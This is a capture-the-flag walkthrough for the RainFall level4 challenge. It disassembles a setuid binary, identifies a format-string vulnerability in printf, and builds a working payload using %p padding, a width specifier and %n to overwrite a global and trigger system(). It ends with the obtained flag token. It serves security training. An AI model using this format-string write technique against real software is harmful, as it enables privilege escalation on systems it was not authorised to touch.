# level4 walkthrough
Given setuid binary, lets disassemble it:

    (gdb) disass main
    Dump of assembler code for function main:
    0x080484a7 <+0>:	push   ebp
    0x080484a8 <+1>:	mov    ebp,esp
    0x080484aa <+3>:	and    esp,0xfffffff0
    0x080484ad <+6>:	call   0x8048457 <n>
    0x080484b2 <+11>:	leave
    0x080484b3 <+12>:	ret
    End of assembler dump.

"n" function called with no arguments, lets disassemble it:

    (gdb) disass n
    Dump of assembler code for function n:
    0x08048457 <+0>:	push   ebp
    0x08048458 <+1>:	mov    ebp,esp
    0x0804845a <+3>:	sub    esp,0x218
    0x08048460 <+9>:	mov    eax,ds:0x8049804
    0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
    0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
    0x08048471 <+26>:	lea    eax,[ebp-0x208]
    0x08048477 <+32>:	mov    DWORD PTR [esp],eax
    0x0804847a <+35>:	call   0x8048350 <fgets@plt>
    0x0804847f <+40>:	lea    eax,[ebp-0x208]
    0x08048485 <+46>:	mov    DWORD PTR [esp],eax
    0x08048488 <+49>:	call   0x8048444 <p>
    0x0804848d <+54>:	mov    eax,ds:0x8049810
    0x08048492 <+59>:	cmp    eax,0x1025544
    0x08048497 <+64>:	jne    0x80484a5 <n+78>
    0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
    0x080484a0 <+73>:	call   0x8048360 <system@plt>
    0x080484a5 <+78>:	leave
    0x080484a6 <+79>:	ret
    End of assembler dump.

"n" function looks similar to the previous level, but there is "p" function called instead of printf, lets disassemble this function:

    (gdb) disass p
    Dump of assembler code for function p:
    0x08048444 <+0>:	push   ebp
    0x08048445 <+1>:	mov    ebp,esp
    0x08048447 <+3>:	sub    esp,0x18
    0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
    0x0804844d <+9>:	mov    DWORD PTR [esp],eax
    0x08048450 <+12>:	call   0x8048340 <printf@plt>
    0x08048455 <+17>:	leave
    0x08048456 <+18>:	ret
    End of assembler dump.

Here is the same vulnerable printf call with buffer argument as format string.
This binary also already have exploit in p+73 which would help us to get next flag.
The problem is that we can't just prefix buffer with random values like in level3 binary because the m value should be too big thus we would exceed buffer size.
But we can use other printf format options to get desired amount of chars printed like width parameter.
Lets check how many pointers wee need to skip:

    level4@RainFall:~$ ./level4
    AAAA %p %p %p %p %p %p %p %p %p %p %p %p
    AAAA 0xb7ff26b0 0xbffff754 0xb7fd0ff4 (nil) (nil) 0xbffff718 0x804848d 0xbffff510 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141

There are 11 pointers on stack before our buffer, lets find how many bytes we need to print:

    python -c 'print("\x10\x98\x04\x08" + "%p"*10 + "%.10000d" + "%n")' > /tmp/level4/exploit

    (gdb) run < /tmp/level4/exploit
    Breakpoint 4, 0x08048492 in n ()
    (gdb) i r eax
    eax            0x2769	10089

We need to add 16930116-89=16930027 bytes:

    level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%p"*10 + "%.16930027d" + "%n")' > /tmp/level4/exploit
    level4@RainFall:~$ ./level4 < /tmp/level4/exploit

Here is our token:

    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a